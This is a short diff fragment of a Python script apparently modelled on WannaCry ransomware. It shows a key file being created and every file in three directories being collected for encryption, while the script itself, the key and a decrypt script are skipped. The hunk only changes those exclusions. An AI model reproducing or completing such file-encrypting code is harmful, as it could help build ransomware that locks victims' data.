@@ -14,19 +14,19 @@ with open("filekey.key", "wb") as filekey: #Create key file
 
 #Gathering all files to encrypt
 for file in os.listdir(path0):
-    if file == "Wish_WannaCry.py" or file == "filekey.key":
+    if file == "My_WannaCry.py" or file == "filekey.key" or file == "My_WannaCry_Decrypt.py":
         continue
     if os.path.isfile(path0 + file):
         files0.append(path0 + file)
 
 for file in os.listdir(path1):
-    if file == "Wish_WannaCry.py" or file == "filekey.key":
+    if file == "My_WannaCry.py" or file == "filekey.key" or file == "My_WannaCry_Decrypt.py":
         continue
     if os.path.isfile(path1 + file):
         files1.append(path1 + file)
 
 for file in os.listdir(path2):
-    if file == "Wish_WannaCry.py" or file == "filekey.key":
+    if file == "My_WannaCry.py" or file == "filekey.key" or file == "My_WannaCry_Decrypt.py":
         continue
     if os.path.isfile(path2 + file):
         files2.append(path2 + file)
